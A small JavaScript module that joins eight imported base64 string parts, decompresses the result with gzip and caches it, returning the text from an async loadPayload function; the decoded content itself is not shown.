import p0 from './part00.js';
import p1 from './part01.js';
import p2 from './part02.js';
import p3 from './part03.js';
import p4 from './part04.js';
import p5 from './part05.js';
import p6 from './part06.js';
import p7 from './part07.js';
const B64=p0+p1+p2+p3+p4+p5+p6+p7;
let cache;
export async function loadPayload(){if(cache)return cache;const bytes=Uint8Array.from(atob(B64),c=>c.charCodeAt(0));const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));cache=await new Response(stream).text();return cache}
